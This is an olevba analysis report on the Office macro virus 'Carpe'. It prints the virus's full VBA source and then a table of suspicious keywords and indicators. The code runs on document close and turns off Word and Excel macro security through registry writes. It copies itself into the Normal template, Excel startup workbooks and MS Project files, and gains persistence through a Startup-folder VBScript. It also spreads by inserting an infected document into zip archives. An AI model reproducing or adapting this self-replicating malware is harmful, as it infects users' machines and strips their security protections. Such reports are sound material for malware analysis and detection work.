olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Carpe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Carpe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()

On Error Resume Next
Options.SaveNormalPrompt = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security", "Level") = 1
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.VirusProtection = (42 - 42)
End If
Options.ConfirmConversions = False
Options.SendMailAttach = True
Set nrm = NormalTemplate: i = 1
Set aiv = ActiveDocument
Set rar = Codmodule
Set aktiv = aiv.VBProject.VBComponents(i).Codemodule
Set nrmal = nrm.VBProject.VBComponents(i).Codemodule
If nrmal.Lines(167, 1) <> "'" Then
nrmal.DeleteLines 1, nrmal.CountOfLines
nrmal.InsertLines 2, aktiv.Lines(2, aktiv.CountOfLines)
nrmal.InsertLines 1, "Sub Document_Open()"
nrmal.Replaceline 67, "Sub Elpaso()": nrmal.Replaceline 105, "Sub Workbook_Dactivate": Open "c:\wrdvbs.exp" For Output As 1:
'Carpe Diem
Print #1, nrmal.Lines(1, nrmal.CountOfLines): Close 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 5 0 1 1 1 1 0 0 0 0 0 0 0 0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 0 7 6 0 0 0 0 0 0 0 0 0 0 0"
End If
If aktiv.Lines(167, 1) <> "'" Then
aktiv.DeleteLines 1, aktiv.CountOfLines
aktiv.InsertLines 2, nrmal.Lines(2, nrmal.CountOfLines)
'I stand on the edge of a new millenium
aktiv.InsertLines 1, "Sub Document_Close()"
aktiv.Replaceline 67, "Sub nacho()": aktiv.Replaceline 105, "Sub Workbook_tivat"
'waiting for yesterdays Dreams
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
Set projobj = GetObject(, "MSProject.Application")
If projobj = "" Then GoTo out
Set proj1obj = projobj.Projects.Add: proj1obj.VBProject.VBComponents.Item(1).Codemodule.InsertLines 1, nrmal.Lines(1, nrmal.CountOfLines)
proj1obj.VBProject.VBComponents.Item(1).Codemodule.Replaceline 67, "Private Sub Project_Deactivate(ByVal pj As MSProject.Project)"
out:
Set xlApp = CreateObject("Excel.Application")
If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
Set BookObj = xlApp.Workbooks.Add
'To Become tomorrows Reality
BookObj.VBProject.VBComponents.Item("ThisWorkbook").Codemodule.InsertLines 1, nrmal.Lines(1, nrmal.CountOfLines)
BookObj.VBProject.VBComponents.Item("ThisWorkbook").Codemodule.Replaceline 105, "Sub Workbook_DeActivate()"
BookObj.SaveAs xlApp.Application.StartupPath & "\Book1."
BookObj.Close: xlApp.Quit
'Carpe Diem!!!!
'
Open "c:\Windows\Start Menu\Programs\Startup\Reminder.Vbs" For Output As 1
Print #1, "Call vbloader": Print #1, "Sub vbloader()": Print #1, "On Error Resume Next"
Print #1, "Set wo = CreateObject(""Word.Application"")": Print #1, "wo.Options.VirusProtection = (Rnd * 0)"
Print #1, "wo.Options.SaveNormalPrompt = (Rnd * 0)": Print #1, "wo.NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.deletelines 1 ,wo.NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.countoflines ": Print #1, "wo.NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.AddFromFile ""c:\wrdvbs.exp""": Print #1, "wo.NormalTemplate.Save"
Print #1, "wo.Quit": Print #1, " ": Print #1, "End Sub": Close 1: Reset
Open "c:\Windows\Zipinf.bat" For Output As 1: Print #1, "Set wz=""c:\Program Files\WinZip\WinZip32.exe"""
Print #1, "for %%a in (*.zip ..\*.zip Windows\Desktop\*.zip) do %wz% -a -r -p %%a c:\cdlist.rtf": Close #1
ActiveDocument.SaveAs FileName:="c:\cdlist.rtf", FileFormat:=wdFormatDocument: Close 1: Reset
Shell "C:\Windows\Zipinf.bat", vbHide
End If
End Sub

Sub nacho()
Application.MacroVirusProtection = (42 - 42)
Dim Z As Project: For Each Z In Projects
On Error GoTo out
Set a = Z.VBProject: Set ap = a.VBComponents(1).Codemodule
Set t = ThisProject: Set tp = t.VBProject.VBComponents(1).Codemodule
If ap.Lines(167, 1) <> "'" Then
ap.DeleteLines 1, ap.CountOfLines
ap.InsertLines 1, tp.Lines(1, tp.CountOfLines)
Application.FileSaveAs Name:=ActiveProject.Name
End If
Next Z
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
crossQuit = True
End If
Set nl = WordObj.NormalTemplate
Set nrmal = nl.VBProject.VBComponents(1).Codemodule
WordObj.Options.SaveNormalPrompt = False
nrmal.DeleteLines 1, nrmal.CountOfLines
nrmal.InsertLines 1, tp.Lines(1, tp.CountOfLines)
nrmal.Replaceline 1, "Sub Document_Open"
nrmal.Replaceline 67, "Sub Elpaso()": nrmal.Replaceline 105, "Sub Workbook_Dactivate": nrmal.Save
If crossQuit = True Then WordObj.Quit
Set xlApp = CreateObject("Excel.Application")
If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
Set bko = xlApp.Workbooks
Set BkObj = bko.Add: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
BkObj.VBProject.VBComponents.Item("ThisWorkbook").Codemodule.InsertLines 1, tp.Lines(1, tp.CountOfLines)
BkObj.VBProject.VBComponents.Item("ThisWorkbook").Codemodule.Replaceline 67, "Sub Workbook_Deactivate()"
BkObj.SaveAs xlApp.Application.StartupPath & "\Book1."
BkObj.Close: xlApp.Quit
End If
out:
End Sub

Sub Workbook_tivat()
On Error Resume Next
Set a = ActiveWorkbook.VBProject
Set t = ThisWorkbook.VBProject
Set aw = a.VBComponents("ThisWorkbook").Codemodule
Set tw = t.VBComponents("ThisWorkbook").Codemodule
tw.Replaceline 105, "Sub Workbook_DeActivate"
If aw.Lines(167, 1) <> "'" Then
aw.DeleteLines 1, aw.CountOfLines
aw.InsertLines 1, tw.Lines(1, tw.CountOfLines)
End If
If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
ActiveWorkbook.SaveAs Excel.Application.StartupPath & "\Book1."
Open "c:\test.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """Level""=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\VBA\Office]"
Print #1, """CodeForeColors""=""1 1 5 0 1 1 1 1 0 0 0 0 0 0 0 0 """
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\VBA\Office]"
Print #1, """CodeBackColors""=""1 1 0 7 6 0 0 0 0 0 0 0 0 0 0 0 """
Close 1
Open "c:\Windows\Start Menu\Programs\Startup\Reminder.Vbs" For Output As 1
Print #1, "Call vbloader": Print #1, "Sub vbloader()": Print #1, "On Error Resume Next"
Print #1, "Set wo = CreateObject(""word.application"")": Print #1, "wo.Options.VirusProtection = (Rnd * 0)"
Print #1, "wo.Options.SaveNormalPrompt = (Rnd * 0)": Print #1, "wo.NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.AddFromFile ""c:\wrdvbs.exp""": Print #1, "wo.NormalTemplate.Save"
Print #1, "wo.Quit": Print #1, " ": Print #1, "End Sub": Close 1
Shell "regedit /s c:\test.reg", vbHide
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
crossQuit = True
End If
Set nr = WordObj.NormalTemplate
Set nrmal = nr.VBProject.VBComponents(1).Codemodule
WordObj.Options.SaveNormalPrompt = (350 - 350)
nrmal.DeleteLines 1, nrmal.CountOfLines
nrmal.InsertLines 1, tw.Lines(1, tw.CountOfLines)
nrmal.Replaceline 1, "Sub Document_Open"
nrmal.Save
If crossQuit = True Then WordObj.Quit
End If
Set projobj = GetObject(, "MSProject.Application")
If projobj = "" Then GoTo out
Set proj1obj = projobj.Projects.Add
proj1obj.VBProject.VBComponents.Item(1).Codemodule.InsertLines 1, aw.Lines(1, aw.CountOfLines)
proj1obj.VBProject.VBComponents.Item(1).Codemodule.Replaceline 67, "Private Sub Project_Deactivate(ByVal pj As MSProject.Project)"
out:
If (Day(Now)) <= 15 And (Month(Now)) = 1 Then
MsgBox "Happy New Year " & Application.UserName, vbExclamation, ""
MsgBox "Its a New millenium so remember", vbInformation, "Carpe Diem!"
Open "c:\ausgang.bat" For Output As 1
Print #1, "@echo No Religion , No Gods , No Masters"
Print #1, "@echo Begin this new age in a new light"
Print #1, "@echo After all we will all die eventually"
Print #1, "@echo and Life isnt all about how much suffering we can endure...is it ???"
MsgBox "With love From The MicroSoft Corporation", vbInformation, "Peace"
Close 1
Shell "c:\ausgang.bat", vbMaximizedFocus
End If
'
'
'
End Sub






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMaximizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Reminder.Vbs        |Executable file name                         |
|IOC       |Zipinf.bat          |Executable file name                         |
|IOC       |WinZip32.exe        |Executable file name                         |
|IOC       |test.reg            |Executable file name                         |
|IOC       |ausgang.bat         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

